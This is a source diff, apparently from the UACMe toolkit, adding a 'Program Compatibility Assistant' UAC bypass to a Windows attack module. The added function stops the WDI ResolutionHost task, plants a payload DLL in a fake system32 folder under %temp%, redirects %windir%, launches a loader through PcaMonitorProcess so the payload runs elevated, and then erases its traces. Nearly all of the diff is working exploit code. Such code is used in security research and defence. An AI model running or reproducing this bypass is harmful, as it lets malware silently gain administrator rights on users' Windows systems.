@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.55
+*  VERSION:     3.56
 *
-*  DATE:        12 Mar 2021
+*  DATE:        16 July 2021
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -18,6 +18,7 @@
 *  https://github.com/AzAgarampur/byeintegrity4-uac
 *  https://github.com/AzAgarampur/byeintegrity-lite
 *  https://github.com/AzAgarampur/byeintegrity7-uac
+*  https://github.com/AzAgarampur/byeintegrity8-uac
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -1344,6 +1345,397 @@ NTSTATUS ucmMsStoreProtocolMethod(
 
     if (SUCCEEDED(hr_init))
         CoUninitialize();
+
+    return MethodResult;
+}
+
+typedef ULONG PCA_PROCESS_TYPE;
+
+#define PCA_MONITOR_PROCESS_NORMAL 0
+#define PCA_MONITOR_PROCESS_NOCHAIN 1
+#define PCA_MONITOR_PROCESS_AS_INSTALLER 2
+
+typedef DWORD(WINAPI* pfnPcaMonitorProcess)(
+    HANDLE hProcess,
+    PCA_PROCESS_TYPE Type,
+    PWSTR lpFileName,
+    PWSTR lpCmdLine,
+    PWSTR lpWorkingDir,
+    DWORD dwFlags);
+
+/*
+* ucmxGetPcaMonitorProcess
+*
+* Purpose:
+*
+* Load pcacli.dll from system32 folder and query PcaMonitorProcess pointer as result.
+*
+*/
+FARPROC ucmxGetPcaMonitorProcess()
+{
+    HMODULE hModule;
+    WCHAR szBuffer[MAX_PATH * 2];
+    FARPROC pfnRoutine = NULL;
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, TEXT("pcacli.dll"));
+
+    hModule = LoadLibraryEx(TEXT("pcacli.dll"), NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
+    if (hModule) {
+        pfnRoutine = GetProcAddress(hModule, "PcaMonitorProcess");
+    }
+
+    return pfnRoutine;
+}
+
+typedef struct _PCA_LOADER_BLOCK {
+    ULONG OpResult;
+    WCHAR szLoader[MAX_PATH + 1];
+} PCA_LOADER_BLOCK;
+
+/*
+* ucmPcaMethod
+*
+* Purpose:
+*
+* Bypass UAC using Program Compatibility Assistant.
+*
+*/
+NTSTATUS ucmPcaMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL fEnvSet = FALSE, fDirCreated = FALSE, fLoaderCreated = FALSE;
+    ULONG pcaStatus;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
+    HRESULT hr_init;
+    SIZE_T cchDirName = 0, nLen, viewSize = PAGE_SIZE;
+
+    pfnPcaMonitorProcess PcaMonitorProcess = NULL;
+
+    HANDLE hSharedSection = NULL, hSharedEvent = NULL;
+    PVOID pvSharedSection = NULL;
+
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION processInfo;
+
+    PCA_LOADER_BLOCK *pvLoaderBlock = NULL;
+
+    WCHAR szBuffer[MAX_PATH * 2], szEnvVar[MAX_PATH * 2];
+    WCHAR szLoader[MAX_PATH + 1];
+    WCHAR szLoaderCmdLine[2];
+    WCHAR szObjectName[MAX_PATH + 1];
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+    RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
+    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
+    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
+
+    do {
+        //
+        // Create shared loader section.
+        //
+        RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
+        supGenerateSharedObjectName((WORD)FUBUKI_PCA_SECTION_ID, szObjectName);
+
+        //
+        // N.B. 
+        // This will create section in the current session BaseNamedObjects directory.
+        //
+        hSharedSection = CreateFileMapping(INVALID_HANDLE_VALUE,
+            NULL,
+            PAGE_READWRITE,
+            0,
+            PAGE_SIZE,
+            szObjectName);
+
+        if (hSharedSection == NULL) {
+            OutputDebugString(L"[UCM] CreateFileMapping failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] CreateFileMapping success\r\n");
+
+        ntStatus = NtMapViewOfSection(
+            hSharedSection,
+            NtCurrentProcess(),
+            &pvLoaderBlock,
+            0,
+            PAGE_SIZE,
+            NULL,
+            &viewSize,
+            ViewUnmap,
+            MEM_TOP_DOWN,
+            PAGE_READWRITE);
+
+        if (!NT_SUCCESS(ntStatus) || (pvLoaderBlock == NULL)) {
+            OutputDebugString(L"[UCM] NtMapViewOfSection failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] NtMapViewOfSection success\r\n");
+
+        //
+        // Create completion event.
+        //
+        _strcpy(szObjectName, TEXT("Global\\"));
+        supGenerateSharedObjectName((WORD)FUBUKI_PCA_EVENT_ID, _strend(szObjectName));
+        hSharedEvent = CreateEvent(NULL, FALSE, FALSE, szObjectName);
+        if (hSharedEvent == NULL) {
+            OutputDebugString(L"[UCM] CreateEvent(SharedEvent) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] CreateEvent(SharedEvent) success\r\n");
+
+        //
+        // Query PCACLI!PcaMonitorProcess.
+        //
+        PcaMonitorProcess = (pfnPcaMonitorProcess)ucmxGetPcaMonitorProcess();
+        if (PcaMonitorProcess == NULL) {
+            OutputDebugString(L"[UCM] ucmxGetPcaMonitorProcess failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] ucmxGetPcaMonitorProcess success\r\n");
+
+        //
+        // Stop WDI\ResolutionHost task.
+        //
+        if (!supStopTaskByName(
+            TEXT("Microsoft\\Windows\\WDI"),
+            TEXT("ResolutionHost")))
+        {
+            OutputDebugString(L"[PCA] supStopTaskByName failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] supStopTaskByName success\r\n");
+
+        //
+        // Create destination dir "system32" in %temp%
+        //
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, SYSTEM32_DIR_NAME);
+        cchDirName = _strlen(szBuffer);
+        if (!CreateDirectory(szBuffer, NULL)) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
+                OutputDebugString(L"[PCA] Fake system32 dir create error\r\n");
+                break;
+            }
+        }
+
+        OutputDebugString(L"[UCM] Fake system32 dir created OK\r\n");
+
+        fDirCreated = TRUE;
+
+        //
+        // Convert payload to dll for 1 stage.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_ENTRYPOINT_PCADLL,
+            FALSE))
+        {
+            OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCADLL) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCADLL) success\r\n");
+
+        //
+        // Drop payload to the fake system32 dir as PCADM.DLL.
+        //
+        szBuffer[cchDirName] = 0;
+        _strcat(szBuffer, TEXT("\\"));
+        _strcat(szBuffer, PCADM_DLL);
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
+            OutputDebugString(L"[UCM] supWriteBufferToFile(PCADLL) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] supWriteBufferToFile(PCADLL) success\r\n");
+
+        //
+        // Convert dll to exe to be loader task.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_ENTRYPOINT_PCAEXE,
+            TRUE))
+        {
+            OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCAEXE) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCAEXE) success\r\n");
+
+        //
+        // Drop loader to the temp dir as winver.exe.
+        //
+        _strcpy(szLoader, g_ctx->szTempDirectory);
+        _strcat(szLoader, WINVER_EXE);
+        fLoaderCreated = supWriteBufferToFile(szLoader, ProxyDll, ProxyDllSize);
+        if (!fLoaderCreated) {
+            OutputDebugString(L"[UCM] supWriteBufferToFile(PCAEXE) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] supWriteBufferToFile(PCAEXE) success\r\n");
+
+        //
+        // Remember loader name
+        //
+        _strcpy(pvLoaderBlock->szLoader, szLoader);
+
+        //
+        // Set new %windir% environment variable.
+        //
+        _strcpy(szEnvVar, g_ctx->szTempDirectory);
+        nLen = _strlen(szEnvVar);
+        if (szEnvVar[nLen - 1] == L'\\') {
+            szEnvVar[nLen - 1] = 0;
+        }
+
+        fEnvSet = supSetEnvVariable(FALSE, NULL, T_WINDIR, szEnvVar);
+        if (fEnvSet == FALSE) {
+            OutputDebugString(L"[UCM] supSetEnvVariable(WINDIR) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] supSetEnvVariable(WINDIR) success\r\n");
+
+
+        //
+        // Set loader command line.
+        //
+        szLoaderCmdLine[0] = TEXT('1');
+        szLoaderCmdLine[1] = 0;
+
+        //
+        // Run loader suspended.
+        //
+        startupInfo.cb = sizeof(startupInfo);
+
+        if (!CreateProcess(
+            szLoader,
+            szLoaderCmdLine,
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_SUSPENDED,
+            NULL,
+            NULL,
+            &startupInfo,
+            &processInfo))
+        {
+            OutputDebugString(L"[UCM] CreateProcess(Loader) failed\r\n");
+            break;
+        }
+
+        OutputDebugString(L"[UCM] CreateProcess(Loader) success\r\n");
+
+        //
+        // Call PCA and resume loader uppon success.
+        //
+        pcaStatus = PcaMonitorProcess(
+            processInfo.hProcess,
+            1, 
+            szLoader, 
+            szLoaderCmdLine,
+            szEnvVar,
+            PCA_MONITOR_PROCESS_NORMAL);
+
+        if (pcaStatus != 0) {
+            OutputDebugString(L"[UCM] PcaMonitorProcess(Loader) failed\r\n");
+            TerminateProcess(processInfo.hProcess, 0);
+            break;
+        }
+
+        OutputDebugString(L"[UCM] PcaMonitorProcess(Loader) success\r\n");
+        
+        ResumeThread(processInfo.hThread);
+        WaitForSingleObject(processInfo.hProcess, INFINITE);
+
+        OutputDebugString(L"[UCM] Waiting for process finished\r\n");
+
+        WaitForSingleObject(hSharedEvent, 200 * 1000);
+
+        OutputDebugString(L"[UCM] Waiting for event finished\r\n");
+
+        MethodResult = (pvLoaderBlock->OpResult == FUBUKI_PCA_ALL_RUN) ? STATUS_SUCCESS : STATUS_ACCESS_DENIED;
+
+        if (pvLoaderBlock->OpResult != FUBUKI_PCA_ALL_RUN)
+            OutputDebugString(L"[UCM] Loader failed\r\n");
+
+    } while (FALSE);
+
+    Sleep(2500);
+
+    //
+    // Cleanup.
+    //
+    if (fEnvSet)
+        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
+
+    if (szLoader[0]) {
+
+        OutputDebugString(L"[UCM] Cleanup, loader regentry");
+        OutputDebugString(szLoader);
+        OutputDebugString(L"\r\n");
+
+        RegDeleteKeyValue(
+            HKEY_CURRENT_USER,
+            T_PCA_STORE,
+            szLoader);
+
+    }
+
+    if (processInfo.hProcess)
+        CloseHandle(processInfo.hProcess);
+    if (processInfo.hThread)
+        CloseHandle(processInfo.hThread);
+
+    if (fLoaderCreated) {
+        OutputDebugString(L"[UCM] Cleanup, loader file");
+        OutputDebugString(szLoader);
+        OutputDebugString(L"\r\n");
+
+        DeleteFile(szLoader);
+    }
+
+    if (fDirCreated) {
+        OutputDebugString(L"[UCM] Cleanup, fake dll");
+        OutputDebugString(szBuffer);
+        OutputDebugString(L"\r\n");
+
+        DeleteFile(szBuffer);
+
+        szBuffer[cchDirName] = 0;
+
+        OutputDebugString(L"[UCM] Cleanup, fake dir");
+        OutputDebugString(szBuffer);
+        OutputDebugString(L"\r\n");
+
+        RemoveDirectory(szBuffer);
+    }
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
+
+    if (hSharedEvent)
+        CloseHandle(hSharedEvent);
+
+    if (pvSharedSection)
+        NtUnmapViewOfSection(NtCurrentProcess(), (PVOID)pvLoaderBlock);
+
+    if (hSharedSection)
+        CloseHandle(hSharedSection);
 
     return MethodResult;
 }
